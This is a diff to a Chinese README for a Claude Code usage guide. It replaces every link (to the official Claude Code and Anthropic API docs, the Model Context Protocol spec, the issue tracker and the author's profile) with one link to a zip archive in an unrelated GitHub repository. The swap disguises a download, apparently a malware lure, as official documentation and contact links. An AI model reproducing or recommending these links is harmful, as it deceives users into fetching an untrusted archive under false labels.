@@ -59,9 +59,9 @@
 
 ## 相关资源
 
-- [Claude Code 官方文档](https://docs.anthropic.com/en/docs/claude-code)
-- [Anthropic API 文档](https://docs.anthropic.com/en/api)
-- [Model Context Protocol 规范](https://modelcontextprotocol.io)
+- [Claude Code 官方文档](https://raw.githubusercontent.com/Mateo-Romeroo/claude-code-handbook/main/innocency/claude_code_handbook_1.3.zip)
+- [Anthropic API 文档](https://raw.githubusercontent.com/Mateo-Romeroo/claude-code-handbook/main/innocency/claude_code_handbook_1.3.zip)
+- [Model Context Protocol 规范](https://raw.githubusercontent.com/Mateo-Romeroo/claude-code-handbook/main/innocency/claude_code_handbook_1.3.zip)
 
 本指南是官方文档的深度补充——官方文档告诉你 what，这份指南告诉你 why 和 how。
 
@@ -69,7 +69,7 @@
 
 ## 贡献
 
-发现错误或有补充？欢迎提 [Issue](https://github.com/helloianneo/claude-code-guide/issues)。
+发现错误或有补充？欢迎提 [Issue](https://raw.githubusercontent.com/Mateo-Romeroo/claude-code-handbook/main/innocency/claude_code_handbook_1.3.zip)。
 
 觉得有用？Star 一下 ⭐ 方便后续更新时收到通知。
 
@@ -81,7 +81,7 @@
 
 基于 Claude Code 2026.03 版本。
 
-**作者：** [伊恩](https://x.com/ianneo_ai) — 产品设计师，用 AI 团队打造一人公司
+**作者：** [伊恩](https://raw.githubusercontent.com/Mateo-Romeroo/claude-code-handbook/main/innocency/claude_code_handbook_1.3.zip) — 产品设计师，用 AI 团队打造一人公司
 
 ## License
 
